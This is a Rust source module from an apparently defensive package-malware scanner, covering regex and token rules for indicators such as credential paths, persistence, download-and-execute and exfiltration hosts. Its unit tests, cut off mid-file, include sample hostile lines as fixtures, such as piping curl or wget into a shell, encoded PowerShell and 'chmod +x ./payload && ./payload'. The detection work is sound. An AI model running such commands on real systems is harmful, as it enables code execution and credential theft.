//! Per-file indicator counting and code statistics (DESIGN.md sections 4.2 and 4.3).
//!
//! Identifier and call patterns are matched on the token stream from [`crate::lexer`], so
//! comments never count and a word inside a string is not mistaken for a call. Patterns
//! about string content (URLs, credential paths, exfiltration hosts, embedded shell
//! commands) are regexes run over string literal contents, or over whole comment-stripped
//! text for shell scripts and npm script commands.

use crate::lexer::{lex, strip_shell_comments, Lang, TokKind, Token};
use regex::{Regex, RegexSet};
use std::sync::LazyLock;

/// Indicator families, in schema order. Index positions are used throughout this module.
pub const INDICATORS: [&str; 14] = [
    "proc_exec",
    "dyn_code",
    "network",
    "decode_obf",
    "env_access",
    "secret_paths",
    "persistence",
    "recon",
    "download_exec",
    "exfil_endpoint",
    "ip_url",
    "url",
    "file_write",
    "crypto_wallet",
];

pub const PROC_EXEC: usize = 0;
pub const DYN_CODE: usize = 1;
pub const NETWORK: usize = 2;
pub const DECODE_OBF: usize = 3;
pub const ENV_ACCESS: usize = 4;
pub const SECRET_PATHS: usize = 5;
pub const PERSISTENCE: usize = 6;
pub const RECON: usize = 7;
pub const DOWNLOAD_EXEC: usize = 8;
pub const EXFIL_ENDPOINT: usize = 9;
pub const IP_URL: usize = 10;
pub const URL: usize = 11;
pub const FILE_WRITE: usize = 12;
pub const CRYPTO_WALLET: usize = 13;
pub const N_IND: usize = INDICATORS.len();

/// Evidence ordering: the most telling indicators first, plain URLs last.
pub const EVIDENCE_RANK: [usize; N_IND] = [
    DOWNLOAD_EXEC,
    EXFIL_ENDPOINT,
    DYN_CODE,
    DECODE_OBF,
    PROC_EXEC,
    SECRET_PATHS,
    PERSISTENCE,
    IP_URL,
    NETWORK,
    RECON,
    ENV_ACCESS,
    CRYPTO_WALLET,
    FILE_WRITE,
    URL,
];

/// Hits kept per file for evidence selection; counts are never capped.
const MAX_HITS_PER_FILE: usize = 400;
/// Strings shorter than this are too short for a meaningful entropy estimate.
const ENTROPY_MIN_LEN: usize = 20;

#[derive(Debug, Clone, Default)]
pub struct FileAnalysis {
    pub counts: [u32; N_IND],
    /// `(indicator, 1-based line)` for evidence.
    pub hits: Vec<(usize, u32)>,
    pub bytes: u64,
    pub n_lines: u64,
    pub max_line_len: u64,
    pub long_lines: u64,
    pub chars: u64,
    pub nonascii_chars: u64,
    pub max_str_entropy: f64,
    pub str_entropy_sum: f64,
    pub n_entropy_strs: u64,
    pub longest_b64_run: u64,
    pub hex_escapes: u64,
    pub n_idents: u64,
    pub n_obf_idents: u64,
    /// Relative module specifiers (`./x`, `../y`) required or imported (JavaScript only).
    pub relative_imports: Vec<String>,
}

impl FileAnalysis {
    fn hit(&mut self, ind: usize, line: u32) {
        self.counts[ind] += 1;
        if self.hits.len() < MAX_HITS_PER_FILE {
            self.hits.push((ind, line));
        }
    }
}

struct StrRule {
    ind: usize,
    re: Regex,
    keep: fn(&str, usize, usize) -> bool,
}

fn always(_: &str, _: usize, _: usize) -> bool {
    true
}

/// `discord` names a token store (`%APPDATA%/discord/Local Storage`), but a Discord webhook
/// URL is an exfiltration endpoint and should not count twice.
fn not_discord_host(hay: &str, start: usize, end: usize) -> bool {
    if !hay[start..end].eq_ignore_ascii_case("discord") {
        return true;
    }
    let rest = &hay.as_bytes()[end..];
    let rest = rest[..rest.len().min(8)].to_ascii_lowercase();
    ![&b".com"[..], b"app.com", b"app.net", b".gg"]
        .iter()
        .any(|h| rest.starts_with(h))
}

/// Loopback and unspecified addresses show up in benign tests and dev servers.
fn public_ipv4(hay: &str, start: usize, end: usize) -> bool {
    let m = &hay[start..end];
    let host = m.split("//").nth(1).unwrap_or("");
    let octets: Vec<u32> = host.split('.').filter_map(|o| o.parse().ok()).collect();
    if octets.len() != 4 || octets.iter().any(|&o| o > 255) {
        return false;
    }
    !(octets[0] == 127 || octets == [0, 0, 0, 0])
}

/// Shell redirection into `/dev/null` is not a file write worth counting.
fn not_dev_null(hay: &str, start: usize, _end: usize) -> bool {
    let after = &hay[start..];
    let gt = after.find('>').unwrap_or(0);
    !after[gt..]
        .trim_start_matches(['>', ' ', '\t'])
        .starts_with("/dev/null")
}

fn rule(ind: usize, pat: &str) -> StrRule {
    StrRule {
        ind,
        re: Regex::new(pat).expect("valid indicator regex"),
        keep: always,
    }
}

fn rule_f(ind: usize, pat: &str, keep: fn(&str, usize, usize) -> bool) -> StrRule {
    StrRule {
        ind,
        re: Regex::new(pat).expect("valid indicator regex"),
        keep,
    }
}

struct RuleSet {
    set: RegexSet,
    rules: Vec<StrRule>,
}

impl RuleSet {
    fn new(rules: Vec<StrRule>) -> Self {
        let set = RegexSet::new(rules.iter().map(|r| r.re.as_str())).expect("valid regex set");
        Self { set, rules }
    }

    /// Run every rule over `hay`. `line_of` maps a byte offset in `hay` to a 1-based line.
    fn apply(&self, hay: &str, fa: &mut FileAnalysis, line_of: &dyn Fn(usize) -> u32) {
        let matched = self.set.matches(hay);
        if !matched.matched_any() {
            return;
        }
        for idx in matched.iter() {
            let r = &self.rules[idx];
            for m in r.re.find_iter(hay) {
                if (r.keep)(hay, m.start(), m.end()) {
                    fa.hit(r.ind, line_of(m.start()));
                }
            }
        }
    }
}

/// Rules over string literal contents in code, and over shell text.
static STRING_RULES: LazyLock<RuleSet> = LazyLock::new(|| {
    RuleSet::new(vec![
        rule_f(
            SECRET_PATHS,
            r"(?i)\.ssh\b|\bid_(?:rsa|dsa|ecdsa|ed25519)\b|\.aws[/\\]+credentials|\.npmrc|\.pypirc|\.git-credentials|\.docker[/\\]+config\.json|login data|local state|cookies\.sqlite|leveldb|discord|wallet|keychain|/etc/passwd|/etc/shadow|\.kube[/\\]+config",
            not_discord_host,
        ),
        rule(
            PERSISTENCE,
            r"(?i)crontab|\.bashrc|\.zshrc|\.bash_profile|(?:^|[/\\~])\.profile\b|start menu[/\\]+programs[/\\]+startup|currentversion[/\\]+run(?:once)?\b|launchagents|launchdaemons|systemd|systemctl\s+enable|schtasks|\.config[/\\]+autostart",
        ),
        rule(
            RECON,
            r"(?i)\b(?:whoami|ifconfig|ipconfig|uname|systeminfo|hostnamectl)\b",
        ),
        rule(
            DOWNLOAD_EXEC,
            r"(?i)\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|python[0-9.]*|node|perl|ruby)\b",
        ),
        rule(
            DOWNLOAD_EXEC,
            r"(?i)\bpowershell(?:\.exe)?\b[^\n]*\s-(?:e|ec|en|enc|enco|encodedcommand)\b",
        ),
        rule(
            DOWNLOAD_EXEC,
            r"(?i)invoke-webrequest|\biwr\s|downloadstring|downloadfile|start-bitstransfer|\bcertutil(?:\.exe)?\b[^\n]*-urlcache|\bbitsadmin\b",
        ),
        rule(
            DOWNLOAD_EXEC,
            r"(?i)\bchmod\s+(?:[ugoa]*\+x|[0-7]{3,4})\s+\S+\s*(?:&&|;|\n)\s*\S",
        ),
        rule(
            EXFIL_ENDPOINT,
            r"(?i)discord(?:app)?\.com/api/webhooks|api\.telegram\.org|pastebin\.com|ngrok|webhook\.site|pipedream\.(?:net|com)|burpcollaborator|\boast\.|interact\.sh|interactsh|requestbin|transfer\.sh|ipinfo\.io|ifconfig\.me|api\.ipify\.org|dnslog\.cn|ceye\.io|hookbin\.com|canarytokens",
        ),
        rule_f(
            IP_URL,
            r"(?i)\bhttps?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
            public_ipv4,
        ),
        rule(URL, r#"(?i)\bhttps?://[^\s'"<>`\\]+"#),
        rule(
            CRYPTO_WALLET,
            r"(?i)bitcoin|ethereum|metamask|exodus|electrum",
        ),
        rule(
            DECODE_OBF,
            r"(?i)\bbase64\s+(?:-d|--decode)\b|frombase64string|\bxxd\s+-r|^rot[_-]?13$",
        ),
        rule(
            NETWORK,
            r"(?i)\b(?:curl|wget)\b|invoke-restmethod|\bnslookup\b",
        ),
    ])
});

/// Additional rules for shell scripts and npm script commands, where every word is a command.
static SHELL_RULES: LazyLock<RuleSet> = LazyLock::new(|| {
    RuleSet::new(vec![
        rule(
            NETWORK,
            r"(?i)\b(?:nc|ncat|netcat|irm|scp|ftp|tftp|telnet)\b",
        ),
        rule(
            PROC_EXEC,
            r"(?i)\b(?:ba|z)?sh\s+-c\b|\bcmd(?:\.exe)?\s+/c\b|\bstart-process\b|\bpowershell(?:\.exe)?\b|\bpwsh\b|\bnohup\b",
        ),
        rule(
            DYN_CODE,
            r"(?i)\beval\b|\binvoke-expression\b|\biex\b|\bnode\s+(?:-e|--eval|-p|--print)\b|\bpython[0-9.]*\s+-c\b",
        ),
        rule(ENV_ACCESS, r"(?i)\$env:|\bprintenv\b|%[a-z_]+%"),
        rule_f(FILE_WRITE, r"(?:^|[^0-9&>])>{1,2}\s*[^\s&|>]", not_dev_null),
        rule(
            FILE_WRITE,
            r"(?i)\bchmod\b|\bset-content\b|\bout-file\b|\btee\b",
        ),
    ])
});

static HEX_ESCAPE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}|\\u\{[0-9a-fA-F]{1,6}\}").unwrap()
});

static WALLET_ADDRESS: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(
        r"^(?:bc1[a-z0-9]{25,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}|0x[a-fA-F0-9]{40}|T[1-9A-HJ-NP-Za-km-z]{33})$",
    )
    .unwrap()
});

const WALLET_WORDS: [&str; 5] = ["bitcoin", "ethereum", "metamask", "exodus", "electrum"];

/// Shannon entropy in bits per byte.
pub fn entropy(s: &[u8]) -> f64 {
    if s.is_empty() {
        return 0.0;
    }
    let mut freq = [0u32; 256];
    for &b in s {
        freq[b as usize] += 1;
    }
    let n = s.len() as f64;
    freq.iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = c as f64 / n;
            -p * p.log2()
        })
        .sum()
}

fn longest_b64_run(s: &str) -> u64 {
    let mut best = 0u64;
    let mut cur = 0u64;
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'_' | b'-') {
            cur += 1;
            best = best.max(cur);
        } else {
            cur = 0;
        }
    }
    best
}

fn is_obf_ident(s: &str) -> bool {
    if let Some(hex) = s.strip_prefix("_0x") {
        if !hex.is_empty() && hex.bytes().all(|b| b.is_ascii_hexdigit()) {
            return true;
        }
    }
    s.len() > 30 && entropy(s.as_bytes()) > 4.3
}

/// Byte offsets of line starts, for mapping regex match offsets to line numbers.
struct LineIndex(Vec<usize>);

impl LineIndex {
    fn new(s: &str) -> Self {
        let mut v = vec![0];
        v.extend(memchr_iter(b'\n', s.as_bytes()).map(|p| p + 1));
        Self(v)
    }
    fn line(&self, off: usize) -> u32 {
        match self.0.binary_search(&off) {
            Ok(i) => i as u32 + 1,
            Err(i) => i as u32,
        }
    }
}

fn memchr_iter(needle: u8, hay: &[u8]) -> impl Iterator<Item = usize> + '_ {
    hay.iter()
        .enumerate()
        .filter(move |(_, &b)| b == needle)
        .map(|(i, _)| i)
}

fn text_stats(fa: &mut FileAnalysis, text: &str) {
    fa.bytes = text.len() as u64;
    for line in text.lines() {
        fa.n_lines += 1;
        let len = line.len() as u64;
        fa.max_line_len = fa.max_line_len.max(len);
        if len > 1000 {
            fa.long_lines += 1;
        }
    }
    for c in text.chars() {
        fa.chars += 1;
        if !c.is_ascii() {
            fa.nonascii_chars += 1;
        }
    }
    fa.hex_escapes = HEX_ESCAPE.find_iter(text).count() as u64;
}

fn string_stats(fa: &mut FileAnalysis, s: &str) {
    if s.len() >= ENTROPY_MIN_LEN {
        let e = entropy(s.as_bytes());
        fa.max_str_entropy = fa.max_str_entropy.max(e);
        fa.str_entropy_sum += e;
        fa.n_entropy_strs += 1;
    }
    fa.longest_b64_run = fa.longest_b64_run.max(longest_b64_run(s));
}

/// Analyze one source file or command string.
pub fn analyze(text: &str, lang: Lang) -> FileAnalysis {
    let mut fa = FileAnalysis::default();
    text_stats(&mut fa, text);
    match lang {
        Lang::Shell => analyze_shell(text, &mut fa),
        Lang::Python | Lang::Js => {
            let toks = lex(text, lang);
            analyze_code(&toks, lang, &mut fa);
        }
    }
    fa
}

fn analyze_shell(text: &str, fa: &mut FileAnalysis) {
    let clean = strip_shell_comments(text);
    let idx = LineIndex::new(&clean);
    let line_of = |off: usize| idx.line(off);
    STRING_RULES.apply(&clean, fa, &line_of);
    SHELL_RULES.apply(&clean, fa, &line_of);
    for tok in lex(text, Lang::Shell) {
        if tok.kind == TokKind::Str {
            string_stats(fa, tok.text);
        } else if tok.kind == TokKind::Ident {
            fa.longest_b64_run = fa.longest_b64_run.max(longest_b64_run(tok.text));
        }
    }
}

fn analyze_code(toks: &[Token<'_>], lang: Lang, fa: &mut FileAnalysis) {
    // Strings and identifiers first: they feed both rules and statistics.
    for t in toks {
        match t.kind {
            TokKind::Str => {
                string_stats(fa, t.text);
                let base = t.line;
                let s = t.text;
                let line_of = |off: usize| {
                    base + s.as_bytes()[..off].iter().filter(|&&b| b == b'\n').count() as u32
                };
                STRING_RULES.apply(s, fa, &line_of);
                if WALLET_ADDRESS.is_match(s.trim()) {
                    fa.hit(CRYPTO_WALLET, t.line);
                }
            }
            TokKind::Ident => {
                fa.n_idents += 1;
                if is_obf_ident(t.text) {
                    fa.n_obf_idents += 1;
                }
                if t.text.len() >= 6 {
                    let lower = t.text.to_ascii_lowercase();
                    if WALLET_WORDS.iter().any(|w| lower.contains(w)) {
                        fa.hit(CRYPTO_WALLET, t.line);
                    }
                }
            }
            _ => {}
        }
    }
    match lang {
        Lang::Python => python_rules(toks, fa),
        Lang::Js => js_rules(toks, fa),
        Lang::Shell => {}
    }
    // Fetch + write + execute in one file is the classic dropper shape.
    if fa.counts[NETWORK] > 0 && fa.counts[FILE_WRITE] > 0 && fa.counts[PROC_EXEC] > 0 {
        let line = fa
            .hits
            .iter()
            .find(|(i, _)| *i == PROC_EXEC)
            .map(|(_, l)| *l)
            .unwrap_or(1);
        fa.hit(DOWNLOAD_EXEC, line);
    }
}

/// Small helper view over a token slice.
struct View<'a, 'b> {
    t: &'b [Token<'a>],
}

impl<'a> View<'a, '_> {
    fn text(&self, i: usize) -> &'a str {
        self.t.get(i).map(|t| t.text).unwrap_or("")
    }
    fn kind(&self, i: usize) -> Option<TokKind> {
        self.t.get(i).map(|t| t.kind)
    }
    fn is_punct(&self, i: usize, p: &str) -> bool {
        self.t
            .get(i)
            .is_some_and(|t| t.kind == TokKind::Punct && t.text == p)
    }
    fn prev_is(&self, i: usize, p: &str) -> bool {
        i > 0 && self.is_punct(i - 1, p)
    }
    /// Identifier before the `.` that precedes token `i` (`os` in `os.system`).
    fn receiver(&self, i: usize) -> Option<&'a str> {
        if i >= 2 && self.is_punct(i - 1, ".") && self.kind(i - 2) == Some(TokKind::Ident) {
            Some(self.text(i - 2))
        } else {
            None
        }
    }
    fn after_dot(&self, i: usize) -> bool {
        self.prev_is(i, ".") || self.prev_is(i, "?.")
    }
    fn call(&self, i: usize) -> bool {
        self.is_punct(i + 1, "(")
    }
    /// Indices of tokens inside the call parentheses that open at `i + 1`.
    fn call_args(&self, i: usize) -> std::ops::Range<usize> {
        let start = i + 2;
        let mut depth = 1usize;
        let mut j = start;
        while j < self.t.len() {
            if self.t[j].kind == TokKind::Punct {
                match self.t[j].text {
                    "(" | "[" | "{" => depth += 1,
                    ")" | "]" | "}" => {
                        depth -= 1;
                        if depth == 0 {
                            break;
                        }
                    }
                    _ => {}
                }
            }
            j += 1;
        }
        start..j.min(self.t.len())
    }
}

fn python_rules(code: &[Token<'_>], fa: &mut FileAnalysis) {
    let v = View { t: code };
    // Whether the current logical line is an import statement.
    let mut in_import = false;
    for (i, tok) in code.iter().enumerate() {
        if tok.kind == TokKind::Newline {
            in_import = false;
            continue;
        }
        if tok.kind != TokKind::Ident {
            continue;
        }
        let name = tok.text;
        let line = tok.line;
        let prev = if i > 0 { v.text(i - 1) } else { "" };
        let at_stmt_start = i == 0 || v.kind(i - 1) == Some(TokKind::Newline);
        if at_stmt_start && (name == "import" || name == "from") {
            in_import = true;
            continue;
        }
        let recv = v.receiver(i);
        let after_dot = v.after_dot(i);
        let bare_call = !after_dot && v.call(i) && prev != "def";

        // proc_exec
        if name == "subprocess"
            || (recv == Some("os")
                && (matches!(name, "system" | "popen" | "popen2" | "popen3" | "startfile")
                    || name.starts_with("exec")
                    || name.starts_with("spawn")
                    || name.starts_with("posix_spawn")))
            || (recv == Some("pty") && name == "spawn")
            || (bare_call
                && matches!(
                    name,
                    "Popen"
                        | "check_output"
                        | "check_call"
                        | "getoutput"
                        | "getstatusoutput"
                        | "system"
                        | "popen"
                ))
        {
            fa.hit(PROC_EXEC, line);
        }

        // dyn_code
        let py2_exec_stmt = name == "exec" && !after_dot && v.kind(i + 1) == Some(TokKind::Str);
        if (bare_call
            && matches!(
                name,
                "eval" | "exec" | "compile" | "execfile" | "__import__"
            ))
            || py2_exec_stmt
            || (name == "import_module" && v.call(i))
            || name == "__builtins__"
        {
            fa.hit(DYN_CODE, line);
        }

        // network: module names used as modules (imported or dereferenced).
        let module_use = in_import || v.is_punct(i + 1, ".");
        if (module_use
            && matches!(
                name,
                "requests"
                    | "urllib"
                    | "urllib2"
                    | "urllib3"
                    | "httplib"
                    | "httpx"
                    | "aiohttp"
                    | "socket"
                    | "ftplib"
                    | "smtplib"
                    | "telnetlib"
                    | "paramiko"
                    | "pycurl"
                    | "websocket"
                    | "websockets"
            )
            && !after_dot)
            || (recv == Some("http") && name == "client")
            || (bare_call && matches!(name, "urlopen" | "urlretrieve"))
        {
            fa.hit(NETWORK, line);
        }

        // decode_obf
        if matches!(
            name,
            "b64decode"
                | "b32decode"
                | "b16decode"
                | "b85decode"
                | "a85decode"
                | "urlsafe_b64decode"
                | "decodebytes"
                | "decodestring"
                | "unhexlify"
                | "a2b_base64"
                | "a2b_hex"
                | "fromhex"
                | "rot13"
                | "rot_13"
        ) || (matches!(recv, Some("zlib" | "gzip" | "bz2" | "lzma")) && name == "decompress")
            || (recv == Some("marshal") && matches!(name, "loads" | "load"))
            || (recv == Some("codecs") && name == "decode")
        {
            fa.hit(DECODE_OBF, line);
        }

        // env_access
        if matches!(name, "environ" | "environb" | "getenv") && !in_import {
            fa.hit(ENV_ACCESS, line);
        }

        // recon
        if (recv == Some("platform") && matches!(name, "node" | "uname"))
            || (recv == Some("os") && name == "uname")
            || (!in_import && matches!(name, "gethostname" | "getfqdn" | "getuser" | "getlogin"))
        {
            fa.hit(RECON, line);
        }

        // file_write
        let open_call = name == "open"
            && v.call(i)
            && (!after_dot || matches!(recv, Some("io" | "codecs" | "builtins")))
            && prev != "def";
        if open_call && py_open_writes(&v, i) {
            fa.hit(FILE_WRITE, line);
        }
        if (after_dot && matches!(name, "write_text" | "write_bytes"))
            || (recv == Some("shutil")
                && matches!(
                    name,
                    "copy" | "copy2" | "copyfile" | "copyfileobj" | "copytree" | "move"
                ))
            || (recv == Some("os") && name == "chmod")
        {
            fa.hit(FILE_WRITE, line);
        }
    }
}

fn py_open_writes(v: &View<'_, '_>, i: usize) -> bool {
    v.call_args(i).any(|j| {
        v.kind(j) == Some(TokKind::Str) && {
            let s = v.text(j);
            !s.is_empty()
                && s.len() <= 4
                && s.bytes().all(|b| b"rwxabt+".contains(&b))
                && s.bytes().any(|b| b"wax".contains(&b))
        }
    })
}

const JS_NET_MODULES: &[&str] = &[
    "http",
    "https",
    "net",
    "dgram",
    "tls",
    "dns",
    "node:http",
    "node:https",
    "node:net",
    "node:dgram",
    "node:tls",
    "node:dns",
    "axios",
    "request",
    "node-fetch",
    "got",
    "ws",
    "socket.io-client",
    "superagent",
    "needle",
    "undici",
];

fn js_rules(code: &[Token<'_>], fa: &mut FileAnalysis) {
    let v = View { t: code };
    let has_cp = code.iter().any(|t| {
        t.kind == TokKind::Str && matches!(t.text, "child_process" | "node:child_process")
    });
    for (i, tok) in code.iter().enumerate() {
        let line = tok.line;
        if tok.kind == TokKind::Str {
            let s = tok.text;
            // A module specifier: `require("x")`, `from "x"`, `import "x"`, `import("x")`.
            let is_spec =
                (i >= 2 && v.prev_is(i, "(") && matches!(v.text(i - 2), "require" | "import"))
                    || (i >= 1
                        && v.kind(i - 1) == Some(TokKind::Ident)
                        && matches!(v.text(i - 1), "from" | "import"));
            if !is_spec {
                continue;
            }
            if matches!(
                s,
                "child_process" | "node:child_process" | "shelljs" | "execa" | "cross-spawn"
            ) {
                fa.hit(PROC_EXEC, line);
            }
            if JS_NET_MODULES.contains(&s) {
                fa.hit(NETWORK, line);
            }
            if (s.starts_with("./") || s.starts_with("../")) && fa.relative_imports.len() < 64 {
                fa.relative_imports.push(s.to_string());
            }
            continue;
        }
        if tok.kind != TokKind::Ident {
            continue;
        }
        let name = tok.text;
        let recv = v.receiver(i);
        let after_dot = v.after_dot(i);
        let prev = if i > 0 { v.text(i - 1) } else { "" };
        let call = v.call(i);

        // proc_exec
        if matches!(name, "execSync" | "spawnSync" | "execFileSync" | "execFile")
            || (has_cp && call && matches!(name, "exec" | "spawn" | "fork"))
        {
            fa.hit(PROC_EXEC, line);
        }

        // dyn_code
        let non_literal_require = (name == "require" || name == "import")
            && !after_dot
            && call
            && !(v.kind(i + 2) == Some(TokKind::Str) && v.is_punct(i + 3, ")"));
        if (name == "eval" && call && prev != "function")
            || (name == "Function" && call && !after_dot)
            || matches!(
                name,
                "runInNewContext" | "runInThisContext" | "runInContext"
            )
            || (recv == Some("vm") && matches!(name, "Script" | "compileFunction"))
            || non_literal_require
        {
            fa.hit(DYN_CODE, line);
        }

        // network
        if (name == "fetch" && call && prev != "function")
            || matches!(name, "axios" | "XMLHttpRequest" | "WebSocket")
            || (matches!(recv, Some("http" | "https")) && matches!(name, "request" | "get"))
            || (recv == Some("net") && matches!(name, "connect" | "createConnection" | "Socket"))
            || (recv == Some("dns")
                && matches!(
                    name,
                    "lookup" | "resolve" | "resolve4" | "resolve6" | "resolveTxt" | "resolveAny"
                ))
        {
            fa.hit(NETWORK, line);
        }

        // decode_obf
        let buffer_decode = recv == Some("Buffer")
            && name == "from"
            && call
            && v.call_args(i).any(|j| {
                v.kind(j) == Some(TokKind::Str)
                    && matches!(v.text(j), "base64" | "hex" | "base64url")
            });
        if (name == "atob" && call)
            || buffer_decode
            || (recv == Some("String") && matches!(name, "fromCharCode" | "fromCodePoint"))
            || (name == "unescape" && call && !after_dot)
            || matches!(
                name,
                "inflateSync"
                    | "gunzipSync"
                    | "inflateRawSync"
                    | "unzipSync"
                    | "brotliDecompressSync"
                    | "rot13"
            )
        {
            fa.hit(DECODE_OBF, line);
        }

        // env_access
        if recv == Some("process") && name == "env" {
            fa.hit(ENV_ACCESS, line);
        }

        // recon
        if matches!(name, "userInfo" | "networkInterfaces")
            || (recv == Some("os") && name == "hostname")
        {
            fa.hit(RECON, line);
        }

        // file_write
        if matches!(
            name,
            "writeFile"
                | "writeFileSync"
                | "appendFile"
                | "appendFileSync"
                | "createWriteStream"
                | "copyFile"
                | "copyFileSync"
                | "chmod"
                | "chmodSync"
        ) {
            fa.hit(FILE_WRITE, line);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn py(src: &str) -> [u32; N_IND] {
        analyze(src, Lang::Python).counts
    }
    fn js(src: &str) -> [u32; N_IND] {
        analyze(src, Lang::Js).counts
    }
    fn sh(src: &str) -> [u32; N_IND] {
        analyze(src, Lang::Shell).counts
    }

    #[test]
    fn proc_exec_python() {
        assert_eq!(
            py("import subprocess\nsubprocess.run(['ls'])\n")[PROC_EXEC],
            2
        );
        assert_eq!(
            py("import os\nos.system('ls')\nos.popen('x')\nos.execvp('a', [])\n")[PROC_EXEC],
            3
        );
        assert_eq!(
            py("from subprocess import Popen\nPopen(['x'])\n")[PROC_EXEC],
            2
        );
        assert_eq!(py("import pty\npty.spawn('/bin/sh')\n")[PROC_EXEC], 1);
    }

    #[test]
    fn proc_exec_python_false_positives() {
        // Comments, strings and unrelated methods do not count.
        assert_eq!(
            py("# subprocess.run(x)\nx = 'os.system'\nself.system()\n")[PROC_EXEC],
            0
        );
        assert_eq!(py("def system(self):\n    pass\n")[PROC_EXEC], 0);
    }

    #[test]
    fn proc_exec_js() {
        let c = js("const cp = require('child_process');\ncp.exec('ls');\ncp.execSync('id');\n");
        assert_eq!(c[PROC_EXEC], 3);
        // `exec` without child_process (RegExp.prototype.exec) does not count.
        assert_eq!(js("const m = /a/.exec(s);\n")[PROC_EXEC], 0);
        assert_eq!(js("// require('child_process')\n")[PROC_EXEC], 0);
        assert_eq!(
            js("import { spawn } from 'node:child_process'; spawn('x');")[PROC_EXEC],
            2
        );
    }

    #[test]
    fn dyn_code_python() {
        assert_eq!(py("eval(x)\nexec(code)\n__import__('os')\n")[DYN_CODE], 3);
        assert_eq!(
            py("import importlib\nimportlib.import_module(name)\n")[DYN_CODE],
            1
        );
        // re.compile and method calls named exec are not dynamic code.
        assert_eq!(
            py("import re\nre.compile('x')\ncursor.exec(q)\n# eval(x)\n")[DYN_CODE],
            0
        );
    }

    #[test]
    fn dyn_code_js() {
        assert_eq!(js("eval(atob(s));\nnew Function('a', b)();\n")[DYN_CODE], 2);
        assert_eq!(
            js("require(path.join(__dirname, x));\nrequire('fs');\n")[DYN_CODE],
            1
        );
        assert_eq!(
            js("const vm = require('vm'); vm.runInNewContext(code);\n")[DYN_CODE],
            1
        );
        assert_eq!(js("/* eval(x) */ const s = 'eval(x)';\n")[DYN_CODE], 0);
    }

    #[test]
    fn network_python_and_js() {
        assert_eq!(
            py("import requests\nrequests.post(u, data=d)\n")[NETWORK],
            2
        );
        assert_eq!(py("import os, socket\ns = socket.socket()\n")[NETWORK], 2);
        assert_eq!(
            py("from urllib.request import urlopen\nurlopen(u)\n")[NETWORK],
            2
        );
        // A local variable named requests that is never dereferenced does not count.
        assert_eq!(py("requests = []\n# import requests\n")[NETWORK], 0);
        assert_eq!(
            js("const https = require('https'); https.get(u);\nfetch(u);\n")[NETWORK],
            3
        );
        assert_eq!(js("const x = 'https';\n")[NETWORK], 0);
    }

    #[test]
    fn decode_obf_python_and_js() {
        assert_eq!(
            py("import base64\nexec(base64.b64decode(s))\n")[DECODE_OBF],
            1
        );
        assert_eq!(
            py("import zlib, marshal\nzlib.decompress(b)\nmarshal.loads(b)\n")[DECODE_OBF],
            2
        );
        assert_eq!(
            py("codecs.decode(s, 'rot13')\nbytes.fromhex(h)\n")[DECODE_OBF],
            3
        );
        assert_eq!(
            js("Buffer.from(s, 'base64').toString();\natob(x);\nString.fromCharCode(1);\n")
                [DECODE_OBF],
            3
        );
        assert_eq!(js("Buffer.from(s, 'utf8');\n")[DECODE_OBF], 0);
    }

    #[test]
    fn env_access() {
        assert_eq!(
            py("import os\nos.environ['X']\nos.getenv('Y')\n")[ENV_ACCESS],
            2
        );
        assert_eq!(py("from os import environ\n")[ENV_ACCESS], 0);
        assert_eq!(js("const t = process.env.NPM_TOKEN;\n")[ENV_ACCESS], 1);
        assert_eq!(js("// process.env\n")[ENV_ACCESS], 0);
    }

    #[test]
    fn secret_paths() {
        let c = py("p = os.path.join(home, '.ssh', 'id_rsa')\nq = '~/.aws/credentials'\n");
        assert_eq!(c[SECRET_PATHS], 3);
        assert_eq!(js("fs.readFileSync(home + '/.npmrc');\n")[SECRET_PATHS], 1);
        // A Discord webhook is an exfil endpoint, not a token-store path.
        let w = js("const u = 'https://discord.com/api/webhooks/1/abc';\n");
        assert_eq!(w[SECRET_PATHS], 0);
        assert_eq!(w[EXFIL_ENDPOINT], 1);
        assert_eq!(
            js("const d = path.join(appdata, 'discord', 'Local Storage', 'leveldb');\n")
                [SECRET_PATHS],
            2
        );
        assert_eq!(py("# read ~/.ssh/id_rsa\n")[SECRET_PATHS], 0);
    }

    #[test]
    fn persistence() {
        assert_eq!(
            py("open(os.path.expanduser('~/.bashrc'), 'a')\n")[PERSISTENCE],
            1
        );
        assert_eq!(
            sh("(crontab -l; echo '* * * * * x') | crontab -\n")[PERSISTENCE],
            2
        );
        assert_eq!(
            js("const k = 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run';\n")
                [PERSISTENCE],
            1
        );
        assert_eq!(sh("schtasks /create /tn x\n")[PERSISTENCE], 1);
    }

    #[test]
    fn recon() {
        assert_eq!(py("import platform, socket, getpass\nplatform.node()\nsocket.gethostname()\ngetpass.getuser()\n")[RECON], 3);
        assert_eq!(
            js("const os = require('os'); os.hostname(); os.userInfo(); os.networkInterfaces();\n")
                [RECON],
            3
        );
        assert_eq!(sh("whoami; uname -a\n")[RECON], 2);
        assert_eq!(js("const hostname = cfg.hostname;\n")[RECON], 0);
    }

    #[test]
    fn download_exec() {
        assert_eq!(
            sh("curl -fsSL https://x.example/a.sh | bash\n")[DOWNLOAD_EXEC],
            1
        );
        assert_eq!(
            py("os.system('wget -qO- http://x | sh')\n")[DOWNLOAD_EXEC],
            1
        );
        assert_eq!(sh("powershell -enc SQBFAFgA\n")[DOWNLOAD_EXEC], 1);
        assert_eq!(
            sh("certutil -urlcache -split -f http://x/a.exe a.exe\n")[DOWNLOAD_EXEC],
            1
        );
        assert_eq!(sh("chmod +x ./payload && ./payload\n")[DOWNLOAD_EXEC], 1);
        assert_eq!(
            sh("# curl x | sh\ncurl -o out.tgz https://x\n")[DOWNLOAD_EXEC],
            0
        );
        // Fetch, write and execute in the same Python file.
        let c = py("import urllib.request, subprocess\nurllib.request.urlretrieve(u, 'a')\nopen('a','wb').write(d)\nsubprocess.call(['a'])\n");
        assert_eq!(c[DOWNLOAD_EXEC], 1);
    }

    #[test]
    fn exfil_ip_url() {
